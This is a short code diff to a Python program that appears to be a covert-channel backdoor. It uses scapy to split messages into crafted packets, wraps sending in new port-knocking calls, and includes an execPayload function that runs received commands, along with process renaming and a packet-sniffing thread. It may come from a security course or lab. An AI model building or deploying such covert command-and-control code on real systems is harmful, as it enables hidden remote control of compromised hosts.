@@ -10,6 +10,7 @@ from multiprocessing import Process
 from cryptoutil import encrypt, decrypt
 from scapy.all import *
 from file_monitoring import *
+from portknocking import *
 import _thread
 import setproctitle
 
@@ -37,10 +38,9 @@ def secret_send(msg: str, type: str = 'command'):
         msg = message_to_bits(msg)
         chunks = message_spliter(msg)
         packets = packatizer(chunks)
-
-        for packet in packets:
-            send(packet, verbose=False)
-            pass
+        knockOpen()
+        send(packets, verbose=True)
+        knockClose()
 
 
 def packatizer(msg):
@@ -98,7 +98,7 @@ def execPayload(command):
     """[summary]
     
     Arguments:
-        command {[type]} -- [description]
+        command {str} -- [description]
     """
 
     # Execute the command
@@ -114,7 +114,7 @@ def commandResult(packet):
     """[summary]
     
     Arguments:
-        packet {[type]} -- [description]
+        packet {scapy.packet} -- [description]
     """
 
     global TTLKEY
@@ -150,3 +150,11 @@ sniffThread.daemon = True
 
 sniffThread.start()
 # fileMonitor.start()
+
+while True:
+    try:
+        time.sleep(5)
+    except KeyboardInterrupt:
+        #reset()
+        print ("Exiting")
+        sys.exit(0)
